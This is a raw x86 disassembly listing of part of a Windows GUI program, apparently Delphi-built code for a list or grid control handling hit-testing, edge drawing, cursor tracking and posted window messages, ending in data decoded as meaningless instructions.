lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp esi eax
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
add eax [ ebp - 0x1d ]
mov [ ebp - 0x15 ] eax
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
inc eax
mov [ ebp + 0xc ] eax
inc [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
lea eax [ esi + 0x1 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x21 ]
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_413a74
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4d ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebx + 0x34 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
inc esi
dec [ ebp - 0x54 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x11 ] al
push ebp
call sub_42a8c4
pop ecx
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov edx esi
call sub_413a74
mov ebx eax
mov eax [ ebx + 0x1a ]
add eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
mov edi [ ebx + 0x16 ]
mov ecx edi
add ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax edi
call sub_412640
mov eax [ ebp - 0x58 ]
mov edx eax
sub edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x40 ]
jle r-xdata
mov [ ebp - 0x5 ] al
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42ad60
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov [ ebx + 0x214 ] eax
mov eax [ ebx + 0x228 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
xor edi edi
inc edi
dec ebp
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_413a74
mov esi eax
mov eax [ esi ]
cmp eax [ esp ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x228 ]
call sub_429594
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp edi eax
jge r-xdata
lea edx [ edi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_413a74
mov [ eax + 0x15 ] 0x1
sub_42addc
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov [ esi ] 0x1
pop esi
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_42ae18
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffec
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41cc14
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
add edx 0x2
mov eax [ esi ]
call sub_41d3c4
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_41d364
mov ecx [ ebx + 0xc ]
inc ecx
mov edx [ ebx ]
mov eax [ esi ]
call sub_41d364
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41cc14
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_41d3c4
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_41d364
mov ecx [ ebx + 0xc ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_41d364
pop esi
pop ebx
pop ebp
retn
sub_42ae9c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebp + 0x8 ]
mov dl [ r-xdata ]
mov [ ebp - 0x15 ] dl
push esi
lea edx [ ebp - 0x15 ]
push edx
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0xd0 ]
test [ ebp - 0x15 ] 0x2
je r-xdata
test [ ebp - 0x15 ] 0x1
je r-xdata
push 0xf
push 0x4
push esi
mov eax [ ebp - 0x4 ]
call sub_41d780
push eax
call DrawEdge
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
sub eax 0x3
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ebx [ esi ]
add ebx 0x3
mov ecx ebx
add ecx 0x2
mov edx [ esi + 0x4 ]
add edx 0x2
mov eax ebx
call sub_412640
push ebp
call sub_42ae18
pop ecx
sub_42af19
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffe8
mov esi eax
cmp [ esi + 0x25a ] 0x0
je r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx esi
mov eax [ esi + 0x25c ]
call [ esi + 0x258 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp + 0x4 ] eax
mov [ esp ] 0x0
inc [ esp ]
dec [ esp + 0x4 ]
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax [ esi + 0x228 ]
call sub_413a74
mov ebx eax
mov edi [ ebx ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax edi
call sub_43daec
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x8 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0xc ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x10 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x14 ] eax
lea eax [ esp + 0x8 ]
push eax
mov ecx edi
mov edx [ esi + 0x208 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xdc ]
cmp [ edi + 0x57 ] 0x0
je r-xdata
sub_42afdc
push ebx
push esi
push edi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
inc edi
mov [ esp + 0xc ] 0x0
inc [ esp + 0xc ]
dec edi
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x228 ]
mov edx [ esp + 0xc ]
call sub_413a74
mov [ esp + 0x8 ] eax
mov ebx [ esp + 0x8 ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x10 ]
mov eax [ ebx ]
call sub_43daec
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x10 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x18 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x1c ] eax
lea ecx [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_412618
push [ esp + 0x24 ]
push [ esp + 0x24 ]
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_42b09c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_444c6c
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_441200
xor eax eax
push ebp
push sub_42b11b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
mov eax [ ebp - 0x4 ]
call sub_441208
retn
sub_42b12a
add [ eax ] al
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_444140
cmp [ esi + 0x4 ] 0x11
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx [ ebx + 0x218 ]
mov eax ebx
call sub_42b46c
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov esi eax
push esp
call GetCursorPos
push 0x1
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_444968
push eax
push 0x0
call MapWindowPoints
mov eax [ esp + 0x4 ]
push eax
push 0x1
mov edx [ esi ]
mov ecx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_42b1b0
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x218 ] edx
mov eax [ esi ]
xor edx edx
mov [ eax + 0x214 ] edx
mov eax [ esi ]
xor edx edx
call sub_42b09c
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx ebx
call sub_413a74
call sub_4026dc
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42b214
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
push esi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_43f748
mov eax [ ebp - 0x4 ]
call sub_43e374
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebp
call sub_42b1b0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_42afdc
mov ebx eax
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42b46c
mov ebx eax
jmp r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov [ edx + 0x218 ] eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x214 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x214 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebx + 0x3d ]
sub edx [ ebp + 0x8 ]
mov eax [ ebx + 0x39 ]
sub eax esi
call sub_412618
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x21c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x220 ] edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov ecx esi
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
sub_42b320
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43fa00
mov eax ebx
call sub_43e374
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx + 0x218 ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_42b46c
test eax eax
je r-xdata
mov esi eax
mov eax [ ebp - 0x8 ]
add eax [ ebx + 0x21c ]
mov [ esi + 0x16 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebx + 0x220 ]
mov [ esi + 0x1a ] eax
mov eax [ esi + 0x16 ]
mov [ esi + 0x39 ] eax
mov eax [ esi + 0x1a ]
mov [ esi + 0x3d ] eax
mov eax [ esi ]
mov eax [ eax + 0x48 ]
add eax [ esi + 0x4 ]
add eax [ esi + 0xc ]
mov [ esi + 0x44 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esi ]
mov eax ebx
call sub_42b09c
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ esi ]
mov edi [ eax + 0x4c ]
mov eax edi
neg eax
cmp eax [ esi + 0x16 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ esi ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
mov eax edi
neg eax
cmp eax [ esi + 0x1a ]
jg r-xdata
mov eax ebx
call sub_43db50
add eax edi
cmp eax [ esi + 0x16 ]
jl r-xdata
mov eax ebx
call sub_43db94
add edi eax
cmp edi [ esi + 0x1a ]
jge r-xdata
sub_42b414
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43faa8
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
mov [ esi + 0x218 ] edx
cmp eax [ esi + 0x214 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe0 ]
xor eax eax
mov [ esi + 0x214 ] eax
jmp r-xdata
sub_42b46c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp ebp [ eax ]
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_413a74
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_413a74
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42b4b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x1 ] 0x1
test ebx ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ eax + 0x23a ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
call sub_43e7f4
lea edx [ ebp - 0x1 ]
push edx
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_42b504
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax edi
call sub_443348
cmp [ edi + 0x211 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x212 ] 0x0
je r-xdata
mov eax [ esi + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ esi + 0x38 ]
mov [ edi + 0x218 ] eax
mov dl 0x1
call sub_43e8b8
mov ebx [ edi + 0x218 ]
mov dx [ ebx + 0x44 ]
mov ax [ ebx + 0x40 ]
call sub_406998
push eax
push 0x1
push 0x201
mov eax edi
call sub_444968
push eax
call PostMessageA
sub_42b594
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov esi eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
mov ecx [ ebp - 0x4 ]
mov eax esi
call sub_44343c
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov [ ebx ] al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
sub_42b5fc
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_42b658
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x22c ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_4553f0
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_444c6c
test al al
je r-xdata
cmp [ ebp + 0x224 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_444968
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_43f334
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42b6f0
push ebx
mov ebx eax
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x0
jne r-xdata
mov eax ebx
call sub_42b658
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
sub_42b730
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44407c
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x218 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_42ad60
cmp [ ebx + 0x5c ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x218 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffee
call sub_40348c
sub_42b780
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
mov al 0x1
movsx ecx [ esi + 0xa ]
movsx edx [ esi + 0x8 ]
mov eax ebx
call sub_42afcc
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42b7b4
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d800
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41cf14
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41d030
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d2ec
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442dbc
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_42b915
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x224 ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] 0x1
xor eax eax
push ebp
push sub_42b8dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fb58
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
pop edx
mov ecx edx
cdq
idiv ecx
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b8e4
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x9 ]
mov [ eax + 0x224 ] dl
retn
inc eax
mov [ ebp - 0x10 ] eax
xor edi edi
inc edi
dec [ ebp - 0x10 ]
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fb70
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
pop edx
mov ecx edx
cdq
idiv ecx
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fb70
imul esi
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fb58
mov edx eax
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
pop ecx
call sub_41d20c
inc esi
dec ebx
jne r-xdata
sub_42b8e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d800
sub_42b974
inc esi
inc edi
add [ edx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
inc esi
inc edi
add [ 0x640000ff ] ch
inc esi
inc edi
add [ esi ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ecx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] dl
add [ eax ] al
inc esi
inc edi
add [ 0x640000ff ] dl
inc esi
inc edi
add [ esi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi ] dl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ eax ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ecx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] bl
add [ eax ] al
inc esi
inc edi
add [ 0x640000ff ] bl
inc esi
inc edi
add [ esi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi ] bl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ eax ] al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ecx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] al
add [ eax ] al
inc esi
inc edi
add [ 0x640000ff ] al
inc esi
inc edi
add [ esi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi ] al
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ eax ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ecx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ ebx ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi + edi * 8 ] cl
add [ eax ] al
inc esi
inc edi
add [ 0x640000ff ] cl
inc esi
inc edi
add [ esi ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add [ edi ] cl
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x47 ] ah
add al bh
inc [ eax ]
add [ edi ] ch
add [ eax ] al
add [ eax ] bl
sub [ edi ] eax
in al 0xba
inc edx
add [ eax ] dl
sub [ edi ] eax
fdivr [ edx + 0x29080042 ]
inc edi
add ah dl
mov edx 0x29000042
inc edi
add ah cl
mov edx 0x28f80042
inc edi
add ah al
mov edx 0x28f00042
inc edi
add [ edx + edi * 4 + 0x28e80042 ] bh
inc edi
add [ edx + edi * 4 + 0x28e00042 ] dh
inc edi
add [ edx + edi * 4 + 0x28d80042 ] ch
inc edi
